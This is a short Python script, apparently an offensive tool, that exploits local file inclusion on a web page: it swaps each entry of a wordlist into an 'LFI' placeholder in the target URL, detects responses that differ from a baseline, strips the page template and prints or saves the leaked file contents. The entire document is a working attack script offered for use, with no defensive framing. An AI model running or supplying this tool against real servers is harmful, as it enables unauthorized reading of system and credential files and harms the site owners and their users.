import sys
from argparse import ArgumentParser
from urllib.request import urlopen

def vrfy_args():
    try:
        open(args.list)
    except Exception as e:
        print("Unable to open the file " + args.list)
        sys.exit()

    if not 'LFI' in args.url:
        print("The url should contain 'LFI', which is the part you want to replace with each line of the wordlist\nExample : http://localhost/page?file=LFI")
        sys.exit()

def exploit_LFI():

    ## Check the default page size when nothing came out of the LFI
    random = "VQ328FEBWUBFI32BUI3BBF"
    URL = args.url.replace('LFI', random)
    page = urlopen(URL)
    default_page = page.read()
    default_size = len(default_page)

    url = args.url
    f = open(args.list)
    for line in f.readlines():
        url_var = url.replace('LFI', line)
        page = urlopen(url_var)
        content = page.read()
        if len(content) != default_size:

            if default_size is not 0:
                final_content = clean_output(content.decode("utf-8"),default_page.decode("utf-8"))
            else:
                final_content = content.decode("utf-8")
            if args.dest == None:
                print("#########################\nResult for => " + line + "#########################\n\n" + final_content )
            else:
                with open(args.dest, 'a') as f:
                    f.write("#########################\nResult for => " + line + "#########################\n\n" + final_content)
                    f.close()


def clean_output(content,default_page):
    ## function to only keep the LFI result and remove the value that are part of the website
    for line in default_page.splitlines():
        content = content.replace(line, '')

    new_content = ""
    for line in content.splitlines():
        if not line == "":
            new_content += line + "\n"

    new_content += "\n"
    return new_content


if __name__ == '__main__':
    p = ArgumentParser()
    p.add_argument('-w', '--wordlist', dest='list',
                   help='Path to the wordlist file', required=True)
    p.add_argument('-u', '--url', dest='url', help='Url of the LFI vulnerable web page http://localhost?file=LFI',
                   required=True)
    p.add_argument('-o', '--outfile', dest='dest', help='Path to the output file, if none the output will be display on the screen', required=False)
    args = p.parse_args()

    vrfy_args()
    exploit_LFI()
